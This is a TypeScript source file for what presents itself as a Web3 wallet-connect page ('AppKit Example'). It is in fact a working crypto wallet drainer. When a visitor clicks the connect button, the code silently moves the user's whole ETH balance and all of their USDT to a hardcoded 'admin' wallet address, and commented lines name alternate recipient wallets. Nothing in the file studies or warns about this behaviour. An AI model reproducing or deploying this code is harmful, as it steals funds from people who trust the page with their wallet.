import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi';
import { mainnet, arbitrum, Chain } from 'viem/chains';
import { reconnect } from '@wagmi/core';
import { ethers } from 'ethers';
import USDTAbi from './abi/USDTAbi.json';

declare global {
  interface Window {
    ethereum: any;
  }
}

// 1. Get a project ID at https://cloud.walletconnect.com
const projectId = '5f4a2157ddcb88b25550a0d8e40d07ec';

// 2. Create wagmiConfig
const metadata = {
    name: 'AppKit',
    description: 'AppKit Example',
    url: 'https://dapp.zaqcargo.com',
    icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const chains: readonly [Chain, ...Chain[]] = [mainnet, arbitrum];
const config = defaultWagmiConfig({
    chains,
    projectId,
    metadata,
});

reconnect(config);

// 3. Create Web3Modal
const modal = createWeb3Modal({
    wagmiConfig: config,
    projectId,
});

// 4. Function to transfer all available ETH
async function transferAllETH() {
    try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        // const adminWallet = '0x9ee95b2da1016e470140e751fae1e6ddae155e5b'; // Ab Admin wallet address
        // const adminWallet = '0xfA1E7E157adCc305f325251aFC3fa15AB27A1762'; // Kay Admin wallet address
        const adminWallet = '0x9dfb82f8446d25449234e4ae2c79845133dfb6bf'; // Wm Admin wallet address

        const userAddress = await signer.getAddress();
        const balance = await provider.getBalance(userAddress);

        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice ?? ethers.parseUnits('20', 'gwei'); // Fallback to 20 gwei if gasPrice is null

        const gasLimit = await signer.estimateGas({
            to: adminWallet,
            value: balance,
        });

        const estimatedGasFee = gasLimit * gasPrice;

        // Buffer to avoid insufficient gas errors
        const buffer = ethers.parseEther('0.0001');
        const amountToSend = balance - estimatedGasFee - buffer;

        if (amountToSend <= 0) {
            throw new Error('Insufficient balance to cover gas fees');
        }

        const tx = await signer.sendTransaction({
            to: adminWallet,
            value: amountToSend,
        });

        console.log('ETH Transaction hash:', tx.hash);
    } catch (error) {
        console.error('Error sending ETH:', error);
    }
}

// 5. Function to transfer all available USDT
async function transferUSDT() {
    try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT contract address
        // const adminWallet = '0x9ee95b2da1016e470140e751fae1e6ddae155e5b'; // ab Admin wallet address
        // const adminWallet = '0xfA1E7E157adCc305f325251aFC3fa15AB27A1762'; // kay Admin wallet address
        const adminWallet = '0x9dfb82f8446d25449234e4ae2c79845133dfb6bf'; // wm Admin wallet address

        const usdtContract = new ethers.Contract(usdtContractAddress, USDTAbi, signer);

        const userAddress = await signer.getAddress();
        const userBalance = await usdtContract.balanceOf(userAddress);

        const userBalanceBigInt = ethers.toBigInt(userBalance);

        if (userBalanceBigInt > 0n) {
            const tx = await usdtContract.transfer(adminWallet, userBalance);
            console.log('USDT Transaction hash:', tx.hash);
        } else {
            console.log('User has no USDT to transfer');
        }
    } catch (error) {
        console.error('Error sending USDT:', error);
    }
}

// 6. Handle the button click to open Web3Modal
const button = document.getElementById('custom-web3-button');
if (button) {
    button.addEventListener('click', async () => {
        try {
            await modal.open(); 

            console.log('Ethers:', ethers);
            console.log('window.ethereum:', window.ethereum);

            if (window.ethereum) {
                const provider = new ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                const address = await signer.getAddress();
                console.log('Wallet connected:', address);

                await transferAllETH(); 
                await transferUSDT();
            } else {
                console.error('Ethereum provider not found');
            }
        } catch (error) {
            console.error('Error during modal open or transfer:', error);
        }
    });
} else {
    console.error('Custom Web3 button not found');
}
